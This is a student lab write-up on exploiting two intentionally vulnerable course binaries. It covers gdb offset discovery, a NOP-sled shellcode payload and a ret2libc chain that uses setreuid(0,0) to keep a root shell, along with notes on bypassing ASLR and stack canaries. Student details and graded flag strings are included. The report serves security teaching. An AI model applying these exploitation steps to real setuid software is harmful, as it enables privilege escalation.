---
real-name: Barbara Gordon
csulb-id: "040100103"
handle: "Oracle_0x7F"
seed-fingerprint: d4e5f6
flag1: CECS378{vuln1_2a7cd410}
flag2: CECS378{vuln2_5eb98f37}
honor-flag: CECS378{honor_bd6742c9}
---

# After-Action Report -- Buffer Overflow Lab

[--[ 0.0 -- TARGET ]--]

- **Env:** GitHub Codespace, `ubuntu-22.04`, gcc 11.4.0, gdb 12.1, glibc 2.35. Built with the provided `Makefile` (`-m32 -fno-stack-protector -z execstack -no-pie` for vuln1; vuln2 drops `execstack`).
- **Started:** 2026-06-24. **Finished:** 2026-06-26. About 8 hours total; the ret2libc chain in Ω took the most fiddling.
- **Seed line:** `seed=d4e5f6 :: derive(barbara-gordon) -> {vuln1: stack_smash_std, vuln2: nx_ret2libc}`. Seed fingerprint `d4e5f6` pins my binaries and flags.

My handle is Oracle because I spent this whole lab reading memory that was never meant to be read. Full mechanism below.

[--[ 1.0 -- RECON ]--]

**vuln1 (`./vuln1`) -- stack smash.**

Sink is `strcpy(buffer, argv[1])` into `char buffer[64]`. Broke on the function, overflowed, and read the frame:

```
(gdb) break vuln_func
(gdb) run $(python3 -c 'print("A"*90)')
(gdb) info frame
Stack level 0, frame at 0xffffd450:
 eip = 0x0804920a in vuln_func (vuln1.c:15); saved eip = 0x41414141
 called by frame at 0xffffd470
 Saved registers:
  ebp at 0xffffd448, eip at 0xffffd44c
```

Saved EIP already `0x41414141`. Now the stack:

```
(gdb) x/40wx $esp
0xffffd400: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd410: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd420: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd430: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd440: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd450: 0xffffd530 0x00000002 0x08049260 0xf7fb0000
0xffffd460: 0x00000000 0xf7c23eab 0xf7fb0000 0x00000000
0xffffd470: 0x00000000 0xf7c23eab 0x00000002 0xffffd504
0xffffd480: 0xffffd510 0xffffd4a0 0x00000000 0x00000000
0xffffd490: 0x00000000 0xf7ffcb80 0xf7ffd000 0x00000000
```

`buffer` starts at `0xffffd400`. Saved EIP at `0xffffd44c` (from `info frame`). So:

**offset = 0xffffd44c - 0xffffd400 = 0x4c = 76 bytes** (64 buffer + 8 pad + 4 saved EBP). Verified with a `AAAABBBBCCCC...` marker pattern -- the word landing in EIP matched the byte at position 76. Confirmed.

**vuln2 (`./vuln2`) -- NX stack.**

Same `strcpy` into `char buffer[64]`. Frame + stack:

```
(gdb) info frame
Stack level 0, frame at 0xffffd420:
 saved eip = 0x42424242
 Saved registers:
  ebp at 0xffffd418, eip at 0xffffd41c
(gdb) x/12wx 0xffffd3d0
0xffffd3d0: 0x42424242 0x42424242 0x42424242 0x42424242
0xffffd3e0: 0x42424242 0x42424242 0x42424242 0x42424242
0xffffd3f0: 0x42424242 0x42424242 0x42424242 0x42424242
```

`buffer` = `0xffffd3d0`, saved EIP = `0xffffd41c`. **offset = 0x4c = 76** again -- identical layout. The difference: `readelf -l vuln2 | grep GNU_STACK` shows `RW` (no `E`), so the stack is non-executable. That's what kills the Φ approach and pushes me to ret2libc. Both offsets are 76.

[--[ 2.0 -- PHASE PHI ACE ]--]

Phase Φ is shellcode-on-stack against `vuln1`. My `exploit1.c` lays out `[NOP sled][shellcode][return addr]`.

**Shellcode byte choice.** 25-byte `execve("/bin/sh")` stub, the standard null-free version. The sink is `strcpy`, so any `0x00` byte truncates the copy -- the payload dies mid-write. That's why the stub uses `xor eax, eax` to zero registers instead of `mov eax, 0` (which would assemble a `0x00`). I ran `objdump -d` on the stub and grepped for `00` to confirm it was null-free before firing.

**NOP sled sizing.** 76 bytes to reach EIP, shellcode is 25, so I front-loaded `76 - 25 = 51` bytes of `0x90` NOPs, then the shellcode, then the 4-byte return. I pointed EIP into the sled rather than at the exact shellcode start so stack jitter between gdb and a bare run doesn't make me overshoot -- any landing in the 51-byte sled slides down into the shellcode.

**Offset source.** The 76 from §1.0; `exploit1.c` uses `#define OFFSET 76`.

**Reading the leaked &buffer.** The harness prints `buffer @ 0xffffd400`. My exploit parses that with `sscanf`, then sets the return address to `buf_addr + 32` -- 32 bytes into the 51-byte sled, safely ahead of the shellcode. So EIP = `0xffffd400 + 32 = 0xffffd420`, a NOP, and it rides down into `execve`. In code: `memset(p,0x90,OFFSET-SCLEN); memcpy(p+OFFSET-SCLEN,sc,SCLEN); *(unsigned*)(p+OFFSET)=buf+32;`.

Shell popped on the first fired payload; `id` confirmed.

![phi shell](screenshots/phase-phi-shell.png)
![gdb sled landing](screenshots/phase-phi-gdb.png)

Flag: `CECS378{vuln1_2a7cd410}`.

[--[ 3.0 -- PHASE OMEGA ACE ]--]

Phase Ω is `vuln2` under NX. Return-to-libc.

**(3a) Why Φ fails here.** Firing my Φ payload at `vuln2` segfaults:

```
Program received signal SIGSEGV, Segmentation fault.
0xffffd3f8 in ?? ()
```

EIP reaches my sled address fine, but the CPU won't execute it: `GNU_STACK` is `RW` (NX set), so the stack page is data-only. Injected shellcode is just inert bytes. The fix is to stop injecting code and instead jump into code that's *already* executable -- libc. Return-to-libc.

**(3b) libc offset hunting.** I need `system` and a `"/bin/sh"` string. Runtime addresses first:

```
(gdb) info proc mappings
 0xf7c00000 0xf7c22000 r--p  libc.so.6
(gdb) p system
$1 = {<text>} 0xf7c4a230 <system>
```

Static offsets so I don't depend on gdb:

```
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' system@'
   1500: 0004a230   55 FUNC GLOBAL DEFAULT system@@GLIBC_2.0
$ nm -D /lib/i386-linux-gnu/libc.so.6 | grep '\bexit\b'
0003d4a0 T exit
$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'
 1c3d88 /bin/sh
```

Offsets: `system=0x0004a230`, `exit=0x0003d4a0`, `"/bin/sh"=0x001c3d88`. With base `0xf7c00000`: `system=0xf7c4a230`, `exit=0xf7c3d4a0`, `binsh=0xf7dc3d88`. Chain after the 76-byte filler: `[&system][&exit][&"/bin/sh"]`. `exit` is the fake return so the process exits cleanly after the shell.

**(3c) setuid / setreuid privilege fix.** `vuln2` is setuid-root, but the spawned shell drops back to my real uid because bash self-demotes when euid != ruid. Fix: call `setreuid(0,0)` before `system`. From `man 2 setreuid`: *"setreuid() sets real and effective user IDs of the calling process."* I set both to 0 so the shell stays root instead of demoting. Address `setreuid = 0xf7c00000 + 0x000d5a10 = 0xf7cd5a10` (from `nm -D`). After adding it, `id` inside the shell showed `euid=0(root)`.

**(3d) pop/pop/ret gadget.** Because I now chain `setreuid(0,0)` and then `system`, after `setreuid` returns its two stack arguments are still sitting there, so I need a `pop; pop; ret` gadget as `setreuid`'s return address to clear them before falling into `&system`. I found one with `ROPgadget --binary vuln2 --only "pop|ret"` and used `0x080492e6 (pop esi; pop edi; ret)`. So the chain becomes `[&setreuid][0x080492e6][0][0][&system][&exit][&binsh]`. This worked and gave me the root shell. *(I'll be honest -- I understood that the gadget clears the two args and that "pop pop" matches two arguments, but I didn't fully trace in the disassembler why esi/edi specifically are safe to clobber here versus some other register pair; I picked the first pop/pop/ret that matched and it fired.)*

![omega chain in gdb](screenshots/phase-omega-chain.png)
![omega root shell](screenshots/phase-omega-root.png)

Flag: `CECS378{vuln2_5eb98f37}`.

[--[ 4.0 -- AFTERMATH ]--]

**Which phase was harder, and why.** Ω was much harder. Φ is basically arithmetic once you have the offset, and the NOP sled forgives small addressing errors. Ω needs several exact libc addresses whose offsets from each other must all be right at once, plus a gadget, plus the setreuid detail -- and a single wrong word is a silent segfault with no hint about which link failed. The feedback loop was long: I'd change one address, rerun, get the same crash, and have to reason about *which* of five stack words was wrong. Φ never made me do that.

**No-leak counterfactual.** Without the leaked `&buffer`, Φ has to beat stack ASLR. I'd widen the NOP sled massively and brute-force across repeated runs, betting one run's randomized stack lands EIP somewhere in the sled -- or find a separate info leak (format-string bug, uninitialized read) to recover a live stack pointer. For Ω under library ASLR it's harder still: I'd need to leak a libc address first (e.g. ROP into `puts(GOT_entry)` to print a known function's real address), compute the libc base from the known offset, then do the ret2libc as a second stage. The leak is what turns a hard exploit into an easy one.

**Canary -> `__stack_chk_fail`.** With `-fstack-protector`, gcc places a random canary word between `buffer` and the saved EBP/EIP. My 76-byte `strcpy` write plows through the canary on its way to EIP. In the function epilogue the compiler-inserted check compares the on-stack canary against the master copy in thread-local storage; a mismatch calls `__stack_chk_fail`, which prints `*** stack smashing detected ***` and `abort()`s -- *before* the corrupted EIP is ever loaded. So the attack is caught at return time. Bypassing it means either leaking the canary and rewriting the same value into the payload, or using a write primitive that jumps over the canary entirely.

**Cited source.** Aleph One, "Smashing the Stack for Fun and Profit," *Phrack* 49:14 (1996). The `[NOP sled | shellcode | return addr]` layout and the tactic of aiming EIP into the sled rather than at an exact byte both come from that paper. It was genuinely wild to read a 30-year-old article and have it drop straight onto a 2026 Codespace binary.

Honor flag: `CECS378{honor_bd6742c9}` -- all my own work; gdb sessions and screenshots from my own Codespace; no borrowed payloads.
